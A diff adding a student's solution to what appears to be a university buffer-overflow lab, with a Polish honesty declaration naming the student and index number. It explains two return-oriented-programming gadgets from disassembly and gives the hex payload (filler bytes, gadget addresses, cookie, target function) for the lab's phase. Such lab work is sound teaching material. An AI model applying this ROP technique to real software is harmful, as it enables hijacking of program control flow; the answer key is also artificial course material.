@@ -1,0 +1,43 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Artur Bieniek, 347165
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+
+ Gadżety:
+    0000000000401ccd <addval_321>:
+    401ccd:	8d 87 58 90 90 c3    	lea    -0x3c6f6fa8(%rdi),%eax
+    401cd3:	c3                   	ret    
+
+    popq %rax
+    Dalej jest 2x nop + return
+
+    Adres 0x401ccd + 2 = 0x401ccf
+
+    0000000000401ce1 <getval_230>:
+    401ce1:	b8 24 48 89 c7       	mov    $0xc7894824,%eax
+    401ce6:	c3                   	ret   
+
+    movq %rax, %rdi
+
+    Adres 0x401ce1 + 2 = 0x401ce3
+
+ Ramka stosu (od "dołu"):
+    adres touch2 = 0x401b5b
+    adres gadgetu rax->rdi = 0x401ce3
+    wartość ciasteczka = 0x54aec3cd
+    adres gadgetu pop rax = 0x401ccf
+    40 bajtów - rozmiar bufora, obojętnie jakie dane
+ */
+
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+de ad c0 de de ad c0 de
+cf 1c 40 00 00 00 00 00 /* gadget popq rax addval_321 */
+cd c3 ae 54 00 00 00 00 /* cookie */
+e3 1c 40 00 00 00 00 00 /* gadget rax->rdi getval_230 */
+5b 1b 40 00 00 00 00 00 /* touch2 */
